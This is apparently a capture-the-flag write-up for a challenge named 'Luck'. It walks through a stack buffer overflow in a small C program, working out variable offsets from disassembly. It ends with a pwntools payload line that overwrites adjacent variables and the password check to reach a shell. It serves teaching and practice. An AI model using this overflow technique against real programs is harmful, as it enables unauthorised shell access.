# Luck

Again, we being by looking at the `luck.c` file

  ```C
  
    int a = 0 , b = 1 , c = 2;
    int password = random();

    puts( "What do you want to tell me:" );
    read( 0 , &a , 100 );
    
    printf("You say: %s\n" , &a);

    if( b == 0xfaceb00c && c == 0xdeadbeef ){
        puts( "Hello hacker, now guess the password." );
        puts( "A good hacker always 100% guess right :P, are you a good hacker?" );
        printf( "password:" );

        int input;
        scanf( "%d" , &input );

        if( input == password ){
            puts( "Here is your shell!" );
            system( "sh" );
        }
        else{
            puts( "Bad Luck :(" );
            exit(0);
        }
    }    
   ```
   
This is another simple BOF question. We can see the overflow point starts from `read( 0 , &a , 100 )`.

What we need to to is to overwrite b, c, and password so that we can access to `system( "sh" )`

Let's start with our `objdump -d luck`

    400869:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
    400870:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%rbp)
    400877:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
    40087e:	e8 6d fe ff ff       	callq  4006f0 <random@plt>
    400883:	89 45 fc             	mov    %eax,-0x4(%rbp)

We can see that a is stored in `rbp - 0x18`, b is stored in `rbp - 0xc`, c is stored in `rbp - 0x8`, and password is stored in `rbp - 0x4`

So, the gap between a, b is 12 bytes (0xc), between b, c is 4 bytes (0x4), and between c, password is 4 bytes (0x4).

Therefore, our padding will need 12 bytes (0xc). b will be replaced with `0xfaceb00c`, c will be replaced with `0xdeadbeef`, and password replaced with can be anything we know.

<b>Note: Remember to send `0xfaceb00c` and `0xdeadbeef` no string</b>

In the end, our play load will be:
  
     p.sendline(p32(0x11111111) + p32(0x11111111) + p32(0x11111111) +  p32(0xfaceb00c) + p32(0xdeadbeef) + p32(0x00000001))
